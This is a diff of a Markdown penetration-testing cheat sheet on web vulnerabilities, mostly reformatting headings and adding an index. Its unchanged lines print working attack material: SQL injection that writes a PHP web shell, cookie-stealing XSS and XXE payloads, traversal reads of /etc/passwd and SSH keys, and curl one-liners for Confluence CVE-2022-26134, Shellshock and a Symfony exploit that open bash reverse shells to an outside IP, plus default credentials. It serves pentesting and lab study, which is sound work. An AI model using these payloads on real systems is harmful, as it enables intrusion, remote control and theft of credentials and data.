@@ -1,8 +1,64 @@
-## Web vulnerabilities
+# Web vulnerabilities
 
-### <ins>SQL Injection</ins>
+## Index
 
-#### <ins>Introduction</ins>
+- [SQL Injection](#sql-injection)
+- [Authentication vulnerabilities](#authentication-vulnerabilities)
+- [Directory Traversal](#directory-traversal)
+- [File inclusion](#file-inclusion)
+- [OS Command Injection](#os-command-injection)
+- [Business logic vulnerabilities](#business-logic-vulnerabilities)
+- [Information Disclosure](#information-disclosure)
+- [Access control vulnerabilities and privilege escalation](#access-control-vulnerabilities-and-privilege-escalation)
+- [File upload vulnerabilities](#file-upload-vulnerabilities)
+- [Server-side request forgery (SSRF)](#server-side-request-forgery-ssrf)
+- [Open redirection](#open-redirection)
+- [XXE injection](#xxe-injection)
+- [Cross-site scripting (XSS)](#cross-site-scripting-xss)
+- [Cross-site request forgery (CSRF)](#cross-site-request-forgery-csrf)
+- [Cross-origin resource sharing (CORS)](#cross-origin-resource-sharing-cors)
+- [Clickjacking](#clickjacking)
+- [DOM-based vulnerabilities](#dom-based-vulnerabilities)
+- [WebSockets](#websockets)
+- [Insecure deserialization](#insecure-deserialization)
+- [Server-side template injection](#server-side-template-injection)
+- [Web cache poisoning](#web-cache-poisoning)
+- [HTTP Host header attacks](#http-host-header-attacks)
+- [HTTP request smuggling](#http-request-smuggling)
+- [JWT Attacks](#jwt-attacks)
+- [OAuth authentication](#oauth-authentication)
+- [GraphQL](#graphql)
+- [WordPress](#wordpress)
+- [IIS - Internet Information Services](#iis---internet-information-services)
+- [Microsoft SharePoint](#microsoft-sharepoint)
+- [Lotus Domino](#lotus-domino)
+- [phpLDAPadmin](#phpldapadmin)
+- [Git source code exposure](#git-source-code-exposure)
+- [Subdomain takeover](#subdomain-takeover)
+- [4** Bypass](#4-bypass)
+- [Application level Denial of Service](#application-level-denial-of-service)
+- [APIs attacks](#apis-attacks)
+- [Grafana attacks](#grafana-attacks)
+- [Confluence attacks](#confluence-attacks)
+- [Kibana](#kibana)
+- [Argus Surveillance DVR](#argus-surveillance-dvr)
+- [Shellshock](#shellshock)
+- [Cassandra web](#cassandra-web)
+- [RaspAP](#raspap)
+- [Drupal](#drupal)
+- [Tomcat](#tomcat)
+- [Booked Scheduler](#booked-scheduler)
+- [phpMyAdmin](#phpmyadmin)
+- [PHP](#php)
+- [Symphony](#symphony)
+- [Adobe ColdFusion](#adobe-coldfusion)
+- [Webmin](#webmin)
+- [Broken Link Hijacking](#broken-link-hijacking)
+
+
+## SQL Injection
+
+### Introduction
 
 **Tools**
 - [SQL injection cheat sheet  | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
@@ -27,7 +83,7 @@
 - `SELECT * FROM tempdb.information_schema.tables;` inspect the available tables in the `tempdb` database
 - `SELECT * from tempdb.dbo.users;`
 
-#### <ins>Identification</ins>
+### Identification
 
 **Error based**
 - `' OR '1'='1`
@@ -96,7 +152,7 @@
 - `&#49;&#32;&#79;&#82;&#32;&#49;&#61;&#49;&#32;&#45;&#45;`
 - https://mothereff.in/html-entities
   
-#### <ins>Notes</ins>
+### Notes
 
 - If you find path / slug you might find an SQLi
 - `' UNION SELECT ("<?php echo system($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'`
@@ -161,7 +217,7 @@ Using the `load_file` function: `?id=1 union all select 1, 2, load_file('C:/Wind
 **How to fix SQL injections**: Use parameterized queries/prepared statements to protect against SQL injections by isolating user input from SQL code. They add placeholders for user input in SQL statements, creating a layer of isolation and preventing user input from affecting SQL code.
 
 
-### <ins>Authentication vulnerabilities</ins>
+## Authentication vulnerabilities
 
 **Multi-factor authentication**
 - Response manipulation, try to intercept the response and modify the status to `200`
@@ -190,8 +246,8 @@ Using the `load_file` function: `?id=1 union all select 1, 2, load_file('C:/Wind
 **Rate-limit**
 - Bypass with `X-Forwarded-For:127.0.0.1-1000`
 - IP rotating, you can use
-  - [mubeng](https://github.com/kitabisa/mubeng)
-  - [Burp extension: IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
+- [mubeng](https://github.com/kitabisa/mubeng)
+- [Burp extension: IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
 - Log in into a valid account to reset the rate-limit
 
 **Web Cache Deception**
@@ -216,7 +272,7 @@ Using the `load_file` function: `?id=1 union all select 1, 2, load_file('C:/Wind
 - Search for [Open Redirect](#open-redirection) in login and register
 - For phpMyAdmin, check default credential `root` and blank password
 
-### <ins>Directory Traversal</ins>
+## Directory Traversal
 
 Directory traversal vulnerabilities allow an attacker to read local secret files. To identify these vulnerabilities, you can search for file extensions in URL query strings and common vulnerable parameters like `file`, `path` and `folder` (see [scripts/fg.rb](scripts/fg.rb))
 
@@ -233,7 +289,7 @@ Directory traversal vulnerabilities allow an attacker to read local secret files
 - `c:\windows\system32\drivers\etc\hosts`
 - `etc/passwd`
 
-### <ins>File inclusion</ins>
+## File inclusion
 
 File inclusion vulnerabilities allow an attacker to include a file into the application’s running code. To identify these vulnerabilities, you can search for file extensions in URL query strings and common vulnerable parameters like `file`, `path` and `folder` (see [scripts/fg.rb](scripts/fg.rb)).
 
@@ -266,7 +322,7 @@ Apache's access.log contamination
 - `/etc/shadow`
 
 
-### <ins>OS Command Injection</ins>
+## OS Command Injection
 
 Let's say that the vulnerable endpoint it's `https://insecure-website.com/stockStatus?productID=381&storeID=29`. The provide the stock information, the application runs the command `stockpile.pl 381 29`. If there is no OS Command Injection protection, by inserting the payload `& echo abcdefg &` in `productID` it's possible to execute the command `echo`.
 
@@ -291,9 +347,7 @@ Ways of injecting OS commands
 - [commix-testbed](https://github.com/commixproject/commix-testbed)
 
 
-
-
-### <ins>Business logic vulnerabilities</ins>
+## Business logic vulnerabilities
 
 **Examples**
 - Excessive trust in client-side controls
@@ -309,8 +363,7 @@ Ways of injecting OS commands
   - Play with parameters and flags to see if you can achieve ATO
 
 
-
-### <ins>Information Disclosure</ins>
+## Information Disclosure
 
 What is information disclosure?
 - Data about other users, such as usernames or financial information
@@ -333,7 +386,7 @@ How do information disclosure vulnerabilities arise?
 
 
 
-### <ins>Access control vulnerabilities and privilege escalation</ins>
+## Access control vulnerabilities and privilege escalation
 
 In the context of web applications, access control is dependent on authentication and session management:
 - Authentication identifies the user and confirms that they are who they say they are;
@@ -356,7 +409,7 @@ From a user perspective, access controls can be divided into the following categ
 
 
 
-### <ins>File upload vulnerabilities</ins>
+## File upload vulnerabilities
 
 **Upload Functions check-list**
 - [ ] Check if the method `PUT` is enabled
@@ -371,8 +424,8 @@ From a user perspective, access controls can be divided into the following categ
       - Binary header
       - Metadata
 - [ ] Where is data stored?
-  - [s3 perms](#abusing-s3-bucket-permissions)
-  - [GCS perms](#google-cloud-storage-bucket)
+- [s3 perms](#abusing-s3-bucket-permissions)
+- [GCS perms](#google-cloud-storage-bucket)
   
 **Extension Splitting**
 - shell.php%00.png
@@ -426,7 +479,7 @@ cat reverse.php >> reverse.php.png
 - See the shells [here](shells/)
 
 
-### <ins>Server-side request forgery (SSRF)</ins>
+## Server-side request forgery (SSRF)
 
 **SSRF with blacklist-based input filters bypass**
 Some applications block input containing hostnames like `127.0.0.1` and localhost, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using various techniques:
@@ -487,7 +540,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 - [SSRF Cheatsheet | Cobalt](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf)
 
 
-### <ins>Open redirection</ins>
+## Open redirection
 
 **Bypasses**
 - https://attacker.com?victim.com
@@ -504,7 +557,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 - https://www.victim.com/redir/r.php?redirectUri=/%0d/attacker.com/
 
 
-### <ins>XXE injection</ins>
+## XXE injection
 
 - **Exploiting XXE to retrieve files**<br/>
   Original
@@ -609,43 +662,43 @@ Manually testing for XXE vulnerabilities generally involves
   ```
 
 
-### <ins>Cross-site scripting (XSS)</ins>
+## Cross-site scripting (XSS)
 
-#### <ins>Bookmarks</ins>
+### Bookmarks
 - [Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
 - [Exploiting XSS via Markdown](https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8)
 - [XSS to Exfiltrate Data from PDFs](https://medium.com/r3d-buck3t/xss-to-exfiltrate-data-from-pdfs-f5bbb35eaba7)
 - [How to craft an XSS payload to create an admin user in WordPress](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/)
 
-#### <ins>Resources</ins>
+### Resources
 - [xsscrapy](https://github.com/DanMcInerney/xsscrapy)
-  - [python3 version](https://github.com/L1NT/xsscrapy) 
+- [python3 version](https://github.com/L1NT/xsscrapy) 
 - For blind XSS
-  - [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
-  - [XSS Hunter](https://xsshunter.com/)
+- [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
+- [XSS Hunter](https://xsshunter.com/)
 - [AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
 - [Weaponised XSS payloads](https://github.com/hakluke/weaponised-XSS-payloads)
 - [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [XSS all the things](XSS%20all%20the%20things/) some payloads to find XSS in various places
 - [JSCompress](https://jscompress.com/)
 
-#### <ins>Bypasses</ins>
+### Bypasses
 - https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)
 - [JSFuck](http://www.jsfuck.com/)
 - [Path Relative style sheet injection](https://portswigger.net/kb/issues/00200328_path-relative-style-sheet-import)
 - [Shortest rXSS possible](https://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
 - If Privileges are required, see if you can chain the XSS with a [CSRF](#cross-site-request-forgery-csrf)
 
-#### <ins>CSP</ins>
+### CSP
 - [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/)
 - [CSP Auditor](https://portswigger.net/bappstore/35237408a06043e9945a11016fcbac18)
 - [CSP Bypass](https://github.com/PortSwigger/csp-bypass)
 
-#### <ins>Blind XSS</ins>
+### Blind XSS
 - Insert a payload in the User-Agent, try with the match/replace rule
 - Other endpoints: pending review comments, feedback
 
-#### <ins>Swagger XSS</ins>
+### Swagger XSS
 - https://github.com/swagger-api/swagger-ui/issues/1262
 - https://github.com/swagger-api/swagger-ui/issues/3847<br/>
   `?url=https://raw.githubusercontent.com/seeu-inspace/easyg/main/XSS/swag-test.json`
@@ -653,12 +706,12 @@ Manually testing for XXE vulnerabilities generally involves
   `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlZXUtaW5zcGFjZS9lYXN5Zy9tYWluL1hTUy9zd2FnLXRlc3QueWFtbCIKfQo=`
 - Nuclei template `%USERPROFILE%\nuclei-templates\exposures\apis\swagger-api.yaml`
 
-#### <ins>Carriage Return Line Feed (CRLF) injection</ins>
+### Carriage Return Line Feed (CRLF) injection
 - `/%0D%0AX-XSS-Protection%3A%200%0A%0A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
 - `/%E5%98%8D%E5%98%8AX-XSS-Protection%3A%200%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
 - Nuclei template `%USERPROFILE%\nuclei-templates\vulnerabilities\generic\crlf-injection.yaml`
 
-#### <ins>Payloads</ins>
+### Payloads
 
 
 - HTML injection
@@ -711,8 +764,8 @@ Manually testing for XXE vulnerabilities generally involves
   ```
 - AngularJS
   - `{{$on.constructor('alert(1)')()}}`
-  - [AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings): `1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
-  - [AngularJS sandbox escape and CSP](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp): `<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';`
+- [AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings): `1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
+- [AngularJS sandbox escape and CSP](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp): `<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';`
 - Steal values from inputs
   ```HTML
   <input name=username id=username>
@@ -762,7 +815,7 @@ ${alert(1)}
 <button popovertarget=x>CLICKME</button><input type="text" readonly="readonly" id="x" popover onbeforetoggle=window.location.replace('http:attacker.com') />
 ```
 
-#### <ins>XSS -> ATO Escalation</ins> [[Reference](https://twitter.com/Rhynorater/status/1682401924635566080)]
+### XSS -> ATO Escalation [[Reference](https://twitter.com/Rhynorater/status/1682401924635566080)]
 - Change email > Password reset
 - Change phone number > SMS password reset
 - Add SSO (Google, Github etc.)
@@ -777,7 +830,7 @@ ${alert(1)}
 - Steal SSO code to adjacent app, then reverse SSO back to main app
 
 
-### <ins>Cross-site request forgery (CSRF)</ins>
+## Cross-site request forgery (CSRF)
 
 - Remove the entire token
 - Use any random but same-length token, or `same-length+1`/`same-length-1`
@@ -835,7 +888,7 @@ ${alert(1)}
   - Add `<script>document.forms[0].submit();</script>` to the PoC
 
 
-### <ins>Cross-origin resource sharing (CORS)</ins>
+## Cross-origin resource sharing (CORS)
 
 **Classic CORS vulnerability**
 ```HTML
@@ -874,7 +927,7 @@ ${alert(1)}
 - [What is CORS (cross-origin resource sharing)? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/cors)
 
 
-### <ins>Clickjacking</ins>
+## Clickjacking
 
 **Classic PoC**
 ```HTML
@@ -901,7 +954,7 @@ ${alert(1)}
 - [What is Clickjacking? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/clickjacking)
 
 
-### <ins>DOM-based vulnerabilities</ins>
+## DOM-based vulnerabilities
 
 Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data.
 
@@ -941,7 +994,7 @@ Many DOM-based vulnerabilities can be traced back to problems with the way clien
 
 
 
-### <ins>WebSockets</ins>
+## WebSockets
 
 Any web security vulnerability might arise in relation to WebSockets:
 - User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection;
@@ -965,7 +1018,7 @@ Any web security vulnerability might arise in relation to WebSockets:
 
 
 
-### <ins>Insecure deserialization</ins>
+## Insecure deserialization
 
 How to spot Insecure deserialization
 - PHP example
@@ -1009,7 +1062,7 @@ Windows Defender might tag the application as virus.
 
 
 
-### <ins>Server-side template injection</ins>
+## Server-side template injection
 - SSTI
 
 - Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. To identify the template engine submit invalid syntax to cause an error message.
@@ -1035,7 +1088,7 @@ Windows Defender might tag the application as virus.
     ```
 
 
-### <ins>Web cache poisoning</ins>
+## Web cache poisoning
 
 **Constructing a web cache poisoning attack**
  1. Identify and evaluate unkeyed inputs
@@ -1058,14 +1111,14 @@ Many websites and CDNs perform various transformations on keyed components when 
 
 
 
-### <ins>HTTP Host header attacks</ins>
+## HTTP Host header attacks
 
 - "If someone sends a cookie called '0', automattic.com responds with a list of all 152 cookies supported by the application:
 curl -v -H 'Cookie: 0=1' https://automattic.com/?cb=123 | fgrep Cookie" [[Reference](https://hackerone.com/reports/310105)];
 - Carriage Return Line Feed (CRLF) injection: "When you find response header injection, you can probably do better than mere XSS or open-redir. Try injecting a short Content-Length header to cause a reverse desync and exploit random live users." [[Reference](https://twitter.com/albinowax/status/1412778191119396864)]
 
 
-### <ins>HTTP request smuggling</ins>
+## HTTP request smuggling
 
 Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends:
 - Content-Length
@@ -1190,7 +1243,7 @@ Impact
 
 
 
-### <ins>JWT Attacks</ins>
+## JWT Attacks
 
 A JWT consists of a `header`, a `payload`, and a `signature`. Each part is separated by a dot.<br/>
  
@@ -1208,12 +1261,12 @@ Common attacks
 
 **Resources**
 - [{JWT}.{Attack}.Playbook](https://github.com/ticarpi/jwt_tool/wiki)
-  - [Checklist](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
+- [Checklist](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
 - [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
 
 
 
-### <ins>OAuth authentication</ins>
+## OAuth authentication
 
 How OAuth 2.0 works:
 - `Client application` The website or web application that wants to access the user's data;
@@ -1239,7 +1292,7 @@ Vulnerabilities in the OAuth service
 
 
 
-### <ins>GraphQL</ins>
+## GraphQL
 
 To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangoncharov.github.io/graphql-voyager/) or [InQL](https://github.com/doyensec/inql) for Burp Suite.
 
@@ -1259,7 +1312,7 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 
 
 
-### <ins>WordPress</ins>
+## WordPress
 
 - Information Disclosure [high]: `/_wpeprivate/config.json`
 - Data exposure:
@@ -1299,7 +1352,7 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 
 
 
-### <ins>IIS - Internet Information Services</ins>
+## IIS - Internet Information Services
 
 - Check if `trace.axd` is enabled
 - Search for
@@ -1327,11 +1380,11 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
 - Wordlist [iisfinal.txt](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#iis-discovery-bruteforce)
 
-### <ins>Microsoft SharePoint</ins>
+## Microsoft SharePoint
 
 - Go to `http://target.com/_layouts/viewlsts.aspx` to see files shared / Site Contents
 
-### <ins>Lotus Domino</ins>
+## Lotus Domino
 
 - Find Lotus Domino with nuclei: `%USERPROFILE%\nuclei-templates\technologies\lotus-domino-version.yaml`
 - Exploit DB: [Lotus-Domino](https://www.exploit-db.com/search?q=Lotus+Domino)
@@ -1339,7 +1392,7 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 
 
 
-### <ins>phpLDAPadmin</ins>
+## phpLDAPadmin
 
 - Endpoint: `phpldapadmin/index.php`
 - Try default logins
@@ -1350,7 +1403,7 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 
 
 
-### <ins>Git source code exposure</ins>
+## Git source code exposure
 
 Once you have the source code, look for the secrets within the files. To find secrets, you can use [trufflehog](https://github.com/trufflesecurity/trufflehog).
 
@@ -1361,7 +1414,7 @@ Once you have the source code, look for the secrets within the files. To find se
 
 
 
-### <ins>Subdomain takeover</ins>
+## Subdomain takeover
 
 **Tools**
 - [Can I take over XYZ?](https://github.com/EdOverflow/can-i-take-over-xyz)
@@ -1369,7 +1422,7 @@ Once you have the source code, look for the secrets within the files. To find se
 
 
 
-### <ins>4** Bypass</ins>
+## 4** Bypass
 - [byp4xx](https://github.com/lobuhi/byp4xx), s/o to [m0pam](https://twitter.com/m0pam) for the tip
 - Search for subdomain with subfinder. Httpx filters subdomains with a 403 response and prints their cname. Test the cname for a bypass
   `subfinder -d atg.se — silent | httpx -sc -mc 403 -cname`, s/o to [drak3hft7](https://twitter.com/drak3hft7) for the tip
@@ -1379,7 +1432,7 @@ Once you have the source code, look for the secrets within the files. To find se
 
 
 
-### <ins>Application level Denial of Service</ins>
+## Application level Denial of Service
 
 - If the application gives the possibility to download data, try to download too much data
   - If there are restrictions, try to bypass
@@ -1390,17 +1443,17 @@ Once you have the source code, look for the secrets within the files. To find se
 - Long Password DoS Attack (Note: the value of password is hashed and then stored in Databases)
   - Check for length restriction and play with it
   - If there is no restriction, test until the application slows down
-  - [password.txt](https://raw.githubusercontent.com/KathanP19/HowToHunt/master/Application_Level_DoS/Password.txt)
+- [password.txt](https://raw.githubusercontent.com/KathanP19/HowToHunt/master/Application_Level_DoS/Password.txt)
 - Long string DoS
 - DoS against a victim
   - Sending a reset link might disable an user's account, spam to prevent the user from accessing their account
   - Multiple wrong passwords might disable an user's account
 
-### <ins>APIs attacks</ins>
+## APIs attacks
 
 Common API path convention: `/api_name/v1`
 
-#### Bruteforce APIs paths with gobuster
+### Bruteforce APIs paths with gobuster
 
 1. Create a pattern file
    ```
@@ -1412,31 +1465,31 @@ Common API path convention: `/api_name/v1`
 3. Inspect the endpoints fuond with `curl` and use recursion
 
 
-### <ins>Grafana attacks</ins>
+## Grafana attacks
 
 **CVE-2021-43798**: Grafana versions 8.0.0-beta1 through 8.3.0, except for patched versions, are vulnerable to directory traversal
 - `curl --path-as-is http://<TARGET>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`
   - Check also for sqlite3 database `/var/lib/grafana/grafana.db` and `conf/defaults.ini` config file
 
 
-### <ins>Confluence attacks</ins>
+## Confluence attacks
 
 
-#### CVE-2022-26134
+### CVE-2022-26134
 
 1. See: [Active Exploitation of Confluence CVE-2022-26134](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)
 2. `curl http://<Confluence-IP>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/<YOUR-IP>/<YOUR-PORT>%200%3E%261%27%29.start%28%29%22%29%7D/`
 3. Run a listener `nc -nvlp 4444`
 
 
-#### <ins>Kibana</ins>
+## Kibana
 
 - RCE https://github.com/mpgn/CVE-2019-7609
 - If you are unable to get code execution reset the machine and try again in a incognito browser window.
 - Remember run the payload on Timelion and then navigate Canvas to trigger it
 
 
-#### <ins>Argus Surveillance DVR</ins>
+## Argus Surveillance DVR
 
 - LFI: `http://192.168.212.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22`
 - Password located at `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`
@@ -1444,13 +1497,13 @@ Common API path convention: `/api_name/v1`
   - l'exploit trova un carattere per volta. Non funziona con i caratteri speciali > se trovi 'Unknown' significa che `e un carattere speciale e lo devi scoprire manualmente
   
 
-#### <ins>Shellshock</ins>
+## Shellshock
 
 - If you find `/cgi-bin/`, search for extensions `sh`, `cgi`, `py`, `pl` and more
 - `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.49.124/1234 0>&1' http://192.168.124.87/cgi-bin/test.sh`
 
 
-#### <ins>Cassandra web</ins>
+## Cassandra web
 
 - `pip install cqlsh`
 - `cqlsh <IP>`
@@ -1461,12 +1514,12 @@ Common API path convention: `/api_name/v1`
 - https://medium.com/@manhon.keung/proving-grounds-practice-linux-box-clue-c5d3a3b825d2
 
 
-#### <ins>RaspAP</ins>
+## RaspAP
 
 - `http://192.168.157.97:8091/includes/webconsole.php`
 
 
-#### <ins>Drupal</ins>
+## Drupal
 
 - Enumerate version by seeing `/CHANGELOG.txt`
 - `droopescan scan drupal -u http://10.10.10.9`
@@ -1476,7 +1529,7 @@ Drupalgeddon
 - `python drupalgeddon3.py http://10.10.10.9/ "SESSd873f26fc11f2b7e6e4aa0f6fce59913=GCGJfJI7t9GIIV7M7NLK8ARzeURzu83jxeqI2_qcDGs" 1 "whoami"`
 
 
-#### <ins>Tomcat</ins>
+## Tomcat
 
 - Default creds
   - `tomcat:s3cret`
@@ -1486,13 +1539,13 @@ Drupalgeddon
   2. Go to `http://10.10.10.85/shell`
 
 
-#### <ins>Booked Scheduler</ins>
+## Booked Scheduler
 
 - 2.7.5 RCE: https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF
 - LFI: `http://192.168.243.64:8003/booked/Web/admin/manage_email_templates.php?dr=template&lang=en_us&tn=../../../../../../../../../etc/passwd&_=1588451710324`
 
 
-#### <ins>phpMyAdmin</ins>
+## phpMyAdmin
 
 - Se presente, testare `root` senza password. Se non funziona, utilizzare root:password
 - Se si riesce a fare login, si pu`o fare RCE con la seguente query
@@ -1500,14 +1553,14 @@ Drupalgeddon
   SELECT LOAD_FILE('C:\\xampp\\htdocs\\nc.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';
   
   
-#### <ins>PHP</ins>
+## PHP
 
 - Command Execution - `preg_replace()` PHP Function Exploit - RCE https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4
 - `<?php echo system($_GET['cmd']); ?>`
 - [Type juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
 
 
-#### <ins>Symphony</ins>
+## Symphony
 
 - [Symphony | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/symphony)
 - http://victim.com/app_dev.php/_profiler/open?file=app/config/parameters.yml
@@ -1516,20 +1569,20 @@ Drupalgeddon
   - `python3 secret_fragment_exploit.py 'http://192.168.164.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.164.233/_fragment' --function system --parameters "bash -c 'bash -i >& /dev/tcp/192.168.45.154/80 0>&1'"`
 
 
-#### <ins>Adobe ColdFusion</ins>
+## Adobe ColdFusion
 
 - See if you find `/CFIDE` or `.cfm` pages
 - It usually runs on port `8500`
 - RCE: https://www.exploit-db.com/exploits/50057
 
 
-#### <ins>Webmin</ins>
+## Webmin
 
 - https://github.com/MuirlandOracle/CVE-2019-15107
   - type 'shell' to get a reverse shell (use ncat with rlwrap)
 
 
-#### <ins>Broken Link Hijacking</ins>
+## Broken Link Hijacking
 
 Resources:
 - [Hunting for Broken Link Hijacking (BLH)](https://www.cobalt.io/blog/hunting-for-broken-link-hijacking-blh)
